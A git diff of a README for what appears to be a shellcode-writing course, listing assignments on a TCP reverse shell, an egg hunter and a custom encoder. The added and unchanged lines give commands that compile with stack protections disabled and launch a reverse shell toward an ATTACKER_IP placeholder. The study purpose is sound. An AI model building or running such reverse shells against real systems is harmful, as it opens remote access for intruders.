@@ -27,7 +27,7 @@ Create a Shell Reverse Tcp Shellcode
 - IP and Port should be easily configurable
 ```
 Implemeted the TCP Reverse Shell shellcode 
-Usage example : 
+Usage : 
 
 => gcc shellcode_with_configurable_port.c -zexecstack -fno-stack-protector -o reverse_shell
 => ./reverse_shell <ATTACKER_IP TO CONNECT> <ATTACKER_PORT_TO_CONNECT>
@@ -42,7 +42,15 @@ Blog : https://oxhat.blogspot.com/2018/04/coding-custom-tcp-reverse-shell.html
 Study about Egg Hunter Shellcode
 - Create a working demo of the Egg Hunter
 - Should be configurable for different payload
+```
+Usage: 
 
+Open the  egghunter_c_wrapper.c and put the any shellcode in the shellcode array location
+=> gcc egghunter_c_wrapper.c -o egghunter_c_wrapper.o -zexecstack -fno-stack-protector
+=> ./egghunter_c_wrapper.o
+
+Blog : https://oxhat.blogspot.com/2019/04/egg-hunter-shellcode.html
+```
 ### Assignment 4
 Create a custom encoding scheme  like "Insertion Encoder" we showed you
 - Poc using execve-stack as the shellcode to encode your schema and execute
